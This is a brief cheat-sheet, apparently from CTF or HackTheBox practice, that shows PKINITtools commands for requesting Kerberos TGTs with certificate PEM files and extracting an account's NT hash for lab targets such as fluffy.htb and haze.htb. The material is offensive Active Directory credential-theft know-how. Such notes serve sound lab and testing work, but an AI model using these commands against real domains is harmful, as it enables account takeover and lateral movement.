# pkinittools

## Overview

https://github.com/dirkjanm/PKINITtools

## Usage

Request a TGT using pem files:

```shell
python ~/workspace/tools/PKINITtools/gettgtpkinit.py -cert-pem kBxhoPQf_cert.pem -key-pem kBxhoPQf_priv.pem fluffy.htb/winrm_svc winrm_svc.ccache
```

```shell
faketime "$(ntpdate -q haze.htb | awk '{print $1" "$2}')" python ~/workspace/tools/PKINITtools/gettgtpkinit.py -cert-pem TC6qIhU0_cert.pem -key-pem TC6qIhU0_priv.pem haze.htb/edward.martin edward_martin.ccache
```

Get NT Hash with AS-REP encryption key and TGT

```shell
export KRB5CCNAME=winrm_svc.ccache
faketime "$(ntpdate -q fluffy.htb | awk '{print $1" "$2}')" python ~/workspace/tools/PKINITtools/getnthash.py -key b76d8e7f24c77e01edb9c11497618b8ee5b90ec609707949b48ca0732e771e70 fluffy.htb/winrm_svc
```